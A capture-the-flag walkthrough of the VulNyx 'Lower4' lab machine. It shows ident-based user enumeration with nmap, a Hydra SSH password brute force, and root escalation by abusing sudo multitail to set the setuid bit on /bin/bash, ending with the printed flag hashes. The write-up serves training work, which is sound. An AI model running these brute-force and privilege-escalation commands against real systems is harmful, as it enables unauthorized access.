# VulNyx - Lower4

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.11
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 14:15 +07
Nmap scan report for 10.11.5.11
Host is up (0.0014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_auth-owners: root
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
113/tcp open  ident?
|_auth-owners: lucifer
MAC Address: 08:00:27:99:94:70 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.12 seconds
```
Service: `ident` (or Authentication Service) is an old protocol used to identify the identity (username) of the user running a specific TCP connection process.

`Nmap` successfully executed the `auth-owners` script using the `-sC` feature. `Nmap` detected a process listening on port 113 run by a user named `lucifer`.

### Shell
We just need to focus on brute-forcing the password for the single user `lucifer` on port 22 (SSH).
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ hydra -l lucifer -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-dup.txt ssh://10.11.5.11 -F -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-18 14:34:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 755995 login tries (l:1/p:755995), ~47250 tries per task
[DATA] attacking ssh://10.11.5.11:22/
[STATUS] 230.00 tries/min, 230 tries in 00:01h, 755767 to do in 54:46h, 14 active
[22][ssh] host: 10.11.5.11   login: lucifer   password: 789456123
[STATUS] attack finished for 10.11.5.11 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-18 14:36:35
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh lucifer@10.11.5.11  
The authenticity of host '10.11.5.11 (10.11.5.11)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.11.5.11' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lucifer@10.11.5.11's password: 
lucifer@lower4:~$ id; hostname
uid=1000(lucifer) gid=1000(lucifer) grupos=1000(lucifer)
lower4
```

### Privilege Escalation
#### Enumeration
```bash
lucifer@lower4:~$ sudo -l
Matching Defaults entries for lucifer on lower4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail
```
#### Abuse
`MultiTail` (a command-line tool used to monitor and view multiple log files simultaneously on Linux, an upgrade from the `tail` command).

The `-l` option in `multitail` executes a command and displays its output (stdout) in a separate window, automatically updating continuously if the command changes.

Use the `-l` option to grant all users permission to read and execute (run) `/bin/bash` files.
```bash
lucifer@lower4:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
lucifer@lower4:~$ sudo -u root /usr/bin/multitail -l "chmod 4755 /bin/bash"
lucifer@lower4:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 mar 27  2022 /bin/bash
lucifer@lower4:~$ /bin/bash -pi
bash-5.1# id;hostname
uid=1000(lucifer) gid=1000(lucifer) euid=0(root) grupos=1000(lucifer)
lower4
```
#### Flags
```bash
bash-5.1# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
c07db370f9e16dcde97d554b38c9c08e
8e99e9f5a7d2d7a067314e34d9fd957f
```

***You are welcome!***
